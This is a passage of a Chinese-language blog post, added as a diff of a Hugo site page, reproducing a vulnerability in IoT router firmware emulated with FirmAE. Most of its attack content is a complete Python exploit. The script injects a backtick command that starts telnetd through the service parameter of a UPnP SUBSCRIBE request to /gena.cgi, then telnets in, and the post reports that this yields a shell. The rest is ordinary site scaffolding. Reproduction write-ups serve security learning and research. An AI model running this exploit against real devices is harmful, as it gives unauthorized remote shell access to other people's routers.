+</h3><p>首先使用固件模拟工具FirmAE进行固件的模拟</p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408271550811.png?x-oss-process=style/zzz"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240827155012711"
+	
+	
+></p>
+<p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408271550834.png?x-oss-process=style/zzz"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240827155037742"
+	
+	
+></p>
+<p>然后直接运行以下exp：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+</span></span><span class="line"><span class="cl"><span class="n">server</span> <span class="o">=</span> <span class="s1">&#39;192.168.10.1&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">49152</span>
+</span></span><span class="line"><span class="cl"><span class="n">shell</span> <span class="o">=</span> <span class="s1">&#39;`telnetd -p 8888 &amp;`&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="n">con</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl"><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">request</span> <span class="o">=</span> <span class="s2">&#34;SUBSCRIBE /gena.cgi?service=&#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">shell</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34; HTTP/1.0</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">request</span> <span class="o">+=</span> <span class="s2">&#34;Host: &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">server</span><span class="p">)</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">port</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">request</span> <span class="o">+=</span> <span class="s2">&#34;Callback: &lt;http://192.168.0.4:34033/ServiceProxy27&gt;</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">request</span> <span class="o">+=</span> <span class="s2">&#34;NT: upnp:event</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">request</span> <span class="o">+=</span> <span class="s2">&#34;Timeout: Second-1800</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">request</span> <span class="o">+=</span> <span class="s2">&#34;Accept-Encoding: gzip, deflate</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">request</span> <span class="o">+=</span> <span class="s2">&#34;User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50</span><span class="se">\n\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">con</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">socket</span><span class="o">.</span><span class="n">gethostbyname</span><span class="p">(</span><span class="n">server</span><span class="p">),</span><span class="n">port</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">con</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">results</span> <span class="o">=</span> <span class="n">con</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;sucess&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;telnet &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">server</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39; 8888&#39;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="https://pic-one1.oss-cn-beijing.aliyuncs.com/typroa/202408271551799.png?x-oss-process=style/zzz"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20240827155129730"
+	
+	
+></p>
+<p>可以成功获得shell</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/iot/">Iot</a>
+        
+            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/dir815/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">DIR815漏洞复现</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2024 zhu1ang
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.26.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    
+    <section class="totalcount">
+    
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+    发表了5篇文章 · 
+    总计1.28k字
+    </section>
+
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+<a href="#" id="back-to-top" title="返回顶部"></a>
+
+
+<style>
+  #back-to-top {
+    display: none;
+    position: fixed;
+    bottom: 20px;
+    right: 55px;
+    width: 55px;
+    height: 55px;
+    border-radius: 7px;
+    background-color: rgba(64, 158, 255, 0.5);
+    box-shadow: var(--shadow-l2);
+    font-size: 30px;
+    text-align: center;
+    line-height: 50px;
+    cursor: pointer;
+  }
+
+  #back-to-top:before {
+    content: ' ';
+    display: inline-block;
+    position: relative;
+    top: 0;
+    transform: rotate(135deg);
+    height: 10px;
+    width: 10px;
+    border-width: 0 0 2px 2px;
+    border-color: var(--back-to-top-color);
+    border-style: solid;
+  }
+
+  #back-to-top:hover:before {
+    border-color: #2674e0;
+  }
+
+   
+  @media screen and (max-width: 768px) {
+    #back-to-top {
+      bottom: 20px;
+      right: 20px;
+      width: 40px;
+      height: 40px;
+      font-size: 10px;
+    }
+  }
+
+   
+  @media screen and (min-width: 1024px) {
+    #back-to-top {
+      bottom: 20px;
+      right: 40px;
+    }
+  }
+
+   
+  @media screen and (min-width: 1280px) {
+    #back-to-top {
+      bottom: 20px;
+      right: 55px;
+    }
+  }
+
+   
+  @media screen and (min-width: 1536px) {
+    #back-to-top {
+      visibility: hidden;
+    }
+  }
+</style>
+
+
+<script>
+  function backToTop() {
+    document.documentElement.scrollIntoView({
+      behavior: 'smooth',
+    })
+  }
+
+  window.onload = function () {
+    let scrollTop =
+      this.document.documentElement.scrollTop || this.document.body.scrollTop
+    let totopBtn = this.document.getElementById('back-to-top')
+    if (scrollTop > 0) {
+      totopBtn.style.display = 'inline'
+    } else {
+      totopBtn.style.display = 'none'
+    }
+  }
+
+  window.onscroll = function () {
+    let scrollTop =
+      this.document.documentElement.scrollTop || this.document.body.scrollTop
+    let totopBtn = this.document.getElementById('back-to-top')
+    if (scrollTop < 200) {
+      totopBtn.style.display = 'none'
+    } else {
+      totopBtn.style.display = 'inline'
+      totopBtn.addEventListener('click', backToTop, false)
+    }
+  }
+</script>
+
+    </body>
+</html>
